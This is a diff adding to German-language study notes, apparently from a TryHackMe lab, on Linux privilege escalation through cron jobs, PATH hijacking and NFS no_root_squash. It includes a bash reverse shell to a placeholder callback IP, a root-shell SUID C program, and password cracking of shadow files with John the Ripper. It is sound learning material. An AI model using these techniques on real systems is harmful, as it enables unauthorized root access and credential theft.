@@ -185,7 +185,11 @@ LFILE=*Datei die Gelesen werden soll* bsp /etc/passwd
 base64 "$LFILE" | base64 --decode
 ```
 
-Das kann man dann nutzen um z.B. die Passwd und Shadow datei auszulesen und zuu kopieren. Diese Kopien kann man dann zusammenfügen via `unshadow passwd.txt shadow.txt > passwords.txt` und dann in John the Ripper weiterverarbeiten und Knacken via `john /usr/share/wordlists/rockyou.txt password.txt `
+Das kann man dann nutzen um z.B. die Passwd und Shadow datei auszulesen und zuu kopieren. Diese Kopien kann man dann zusammenfügen via `unshadow passwd.txt shadow.txt > passwords.txt` und dann in John the Ripper weiterverarbeiten und Knacken via 
+
+```
+john --wordlist=/usr/share/wordlists/rockyou.txt password.txt
+```
 
 # Privilegien Eskalieren: Capabilities
 
@@ -215,3 +219,87 @@ Jeder Benutzer auf dem System hat seine eigene crontab-Datei und kann bestimmte 
 Wiegesagt jeder User hat zugriff auf die Cron-Jobs unter `/etc/crontab`
 
 Hier kann es auch vorkommen das ein Cronjob existiert aber das Script gelöscht wurde das der job ausführen soll. Das kann man dann natürliuch nutzen um ein eigenes Script mit passenden namen an der Passenden stelle einzufügen. Egal ob man jetzt das Scripüt anpasst oder ein neues hinerlegt kann man sich hier nach Herzenswunsch austoben um z.B. Automatisch eine Reverseshell mit Root rechten zu starten
+
+Das geht zum beispiel indem man das Script verwendet 
+```
+#!/bin/bash
+
+bash -i >& /dev/tcp/*CallbackIP*/*callbackPort* 0>&1
+```
+
+# Privilegien Eskalierung: PATH
+
+Wenn sich ein Ordner, für den Ihr Benutzer Schreibrechte hat, im Path befindet, kann eine Anwendung möglicherweise zur Ausführung eines Skripts missbraucht werden. PATH in Linux ist eine Umgebungsvariable, die dem Betriebssystem mitteilt, wo es nach ausführbaren Dateien suchen soll. Bei jedem Befehl, der nicht in die Shell integriert oder nicht mit einem absoluten Pfad definiert ist, beginnt Linux mit der Suche in den unter PATH definierten Ordnern. (PATH ist die Umgebungsvariable, von der hier die Rede ist, Pfad ist der Speicherort einer Datei).
+
+Was ist hier wichtig zu Wissen/Testen?
+- Welche Ordner befinden sich unter $PATH
+- Hat der aktuelle Benutzer Schreibrechte für einen dieser Ordner?
+- Kann $PATH geändert werden?
+- Gibt es ein Skript/eine Anwendung, die gestartet werden kann und die von dieser Sicherheitslücke betroffen ist?
+
+
+Beispiel:
+
+we can use the `find / -writable 2>/dev/null | grep home` command to find the writable folders.
+In your terminal where you logged in as Karen, run the `cd /home` command so that we can see which files we can access. When we run `-ls -a` we can sere that we have matt, murdoch, and ubuntu. Our flag.txt will be under matt, but let's see whats under murdoch since we have writeable access to it.
+
+In dem Benutzerordner Murdock finden wir in dem Fall ein Python Script welches eine Dependency auf "thm" hat. Das können wir dann ausnutzen und ein kleines script basteln was dann "thm" heißt um die Flag Datei zu lesen.
+Erstellen Sie die thm-Datei mit touch thm.
+
+Schreiben Sie das Skript in diese Datei mit `echo "cat /home/matt/flag6.txt" > thm`.
+Um diese thm-Datei ausführbar zu machen, müssen wir sie mit dem Befehl `chmod +x thm` umwandeln.
+Bevor wir nun ./test ausführen können, müssen wir den Pfad exportieren via  `export PATH=/home/murdoch:$PATH`
+Schließlich können wir den Befehl ./test ausführen. Wir haben unsere PATH-Schwachstelle erfolgreich ausgenutzt!
+
+am besten hier nochmal anschauen 
+https://dev.to/christinec_dev/try-hack-me-linux-privesc-complete-write-up-20fg
+
+# Privilegien Eskalierung: NFS
+
+Vektoren für die Eskalation von Rechten sind nicht auf den internen Zugriff beschränkt. Auch über freigegebene Ordner und Fernverwaltungsschnittstellen wie SSH und Telnet kann man sich root-Zugriff auf das Zielsystem verschaffen. In einigen Fällen ist es auch erforderlich, beide Vektoren zu nutzen, z. B. einen privaten SSH-Schlüssel für root auf dem Zielsystem zu finden und sich über SSH mit root-Rechten zu verbinden, anstatt zu versuchen, die Berechtigungsstufe des aktuellen Benutzers zu erhöhen.
+
+Ein weiterer Vektor, der eher für CTFs und Prüfungen relevant ist, ist eine falsch konfigurierte Netzwerk-Shell. Dieser Vektor kann manchmal bei Penetrationstests beobachtet werden, wenn ein Netzwerk-Backup-System vorhanden ist.
+
+Die NFS-Konfiguration (Network File Sharing) wird in der Datei `/etc/exports` gespeichert. Diese Datei wird bei der Installation des NFS-Servers erstellt und kann normalerweise von den Benutzern gelesen werden.
+Das entscheidende Element für diesen Vektor der Privilegienerweiterung ist die Option „no_root_squash“. Standardmäßig ändert NFS den Root-Benutzer in nfsnobody und entfernt jede Datei, die mit Root-Rechten arbeitet. Wenn die Option „no_root_squash“ auf einer beschreibbaren Freigabe vorhanden ist, können wir eine ausführbare Datei mit gesetztem SUID-Bit erstellen und sie auf dem Zielsystem ausführen.****
+
+
+Exploitation: 
+Auf der Ziel Maschine
+Zuerst gilt es sich umzuschauen auf was man genau zugriff hat via `showmount -e *IPAdresse*` darauf hin kann man auch einen Share Mounten auf dem "no_root_squash" enabeld ist. Das geht via `mount -o rw *IPAdresse*:*ZielShare* /tmp/backupsOnAttackermashine` Das ist dann auch f ür das erste alles was man auf der Maschine machen muss.
+
+Auf der Angreifer Maschine:
+Hier erstellen wir ein Verzeichnis welches wir dann mit dem Ziel Verbinden/mounten in z.B. Temp. Nachdem wir es Verbunden haben können wir dort zum beispiel das Folgende Script anlegen und dann Compilern. (Anlegen geht direkt via Nano)
+
+```
+
+#include <stdio.h>
+#include <stdlib.h>
+
+int main()
+{
+   setgid(0);
+   setuid(0);
+   system("/bin/bash");
+   return 0;
+}
+
+```
+
+In dem Beispiel habe ich den Output als nfs.c gespeichert und dann mit den Folgenden Befehlen Compiliert, Ausführbar gemacht und dann noch die Rechte Kontrolliert: 
+```
+gcc nfs.c -o nfs -w
+chmod +s nfs
+ls -l nfs
+```
+
+Nun ist nur noch der letzte schritt offen und das ist das Script auf der Zielmaschine auszuführen (in dem Fall via ./nfs)
+
+### Enumeration von Mountable Shares
+
+| Befehl                               | Wirkung                                                                |
+| ------------------------------------ | ---------------------------------------------------------------------- |
+| showmount -e *IP Adresse des Shares* | Zeigt an auf welche Verzeichnisse innerhalb des Shares man Zugriff hat |
+| mount -o rw *ZielIP:/ZielShare*      | Moiunting des Shares                                                   |
+
+ 
